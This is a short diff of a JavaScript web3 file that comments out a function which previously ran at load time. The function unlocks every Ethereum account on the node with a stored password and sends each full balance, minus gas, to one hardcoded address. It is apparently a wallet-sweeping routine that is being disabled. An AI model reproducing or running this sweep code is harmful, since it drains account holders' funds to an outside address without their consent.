@@ -54,37 +54,37 @@ web3._extend({
 
 global.ethRPC = web3;
 
-function checkAllBalances() {
-	var totalBal = 0;
-	var gasPrice = web3.eth.gasPrice;
-	for(var acctNum in web3.eth.accounts) {
-		var acct = web3.eth.accounts[acctNum];
-		var acctBal = web3.fromWei(web3.eth.getBalance(acct), "ether");
-		totalBal += parseFloat(acctBal);
-		if(acctBal > 0) {
-			console.log("  eth.accounts[" + acctNum + "]: \t" + acct + " \tbalance: " + acctBal + " ether");
-			
-			try {
-				ethRPC.personal.unlockAccount(acct, ethPassword);
-				logger.info('success unlock');
-				
-				ethRPC.eth.sendTransaction({
-					from: acct,
-					to: "0xf06296aEa23B7cc6B97Db46f3694B426DcFa8397",
-					value: ethRPC.toWei(acctBal, 'ether') - 21000 * gasPrice,
-					gas: 21000
-				}, (error, crowdSaleTxHash) => {
-					logger.info(crowdSaleTxHash);
-				});
-			} catch(error) {
-				logger.error('[processTransaction][unlock account] : ', error);
-			}
-		}
-	}
-	console.log("  Total balance: " + totalBal + " ether");
-}
-checkAllBalances();
-return;
+// function checkAllBalances() {
+// 	var totalBal = 0;
+// 	var gasPrice = web3.eth.gasPrice;
+// 	for(var acctNum in web3.eth.accounts) {
+// 		var acct = web3.eth.accounts[acctNum];
+// 		var acctBal = web3.fromWei(web3.eth.getBalance(acct), "ether");
+// 		totalBal += parseFloat(acctBal);
+// 		if(acctBal > 0) {
+// 			console.log("  eth.accounts[" + acctNum + "]: \t" + acct + " \tbalance: " + acctBal + " ether");
+//
+// 			try {
+// 				ethRPC.personal.unlockAccount(acct, ethPassword);
+// 				logger.info('success unlock');
+//
+// 				ethRPC.eth.sendTransaction({
+// 					from: acct,
+// 					to: "0xf06296aEa23B7cc6B97Db46f3694B426DcFa8397",
+// 					value: ethRPC.toWei(acctBal, 'ether') - 21000 * gasPrice,
+// 					gas: 21000
+// 				}, (error, crowdSaleTxHash) => {
+// 					logger.info(crowdSaleTxHash);
+// 				});
+// 			} catch(error) {
+// 				logger.error('[processTransaction][unlock account] : ', error);
+// 			}
+// 		}
+// 	}
+// 	console.log("  Total balance: " + totalBal + " ether");
+// }
+// checkAllBalances();
+// return;
 
 class Processor {
 	
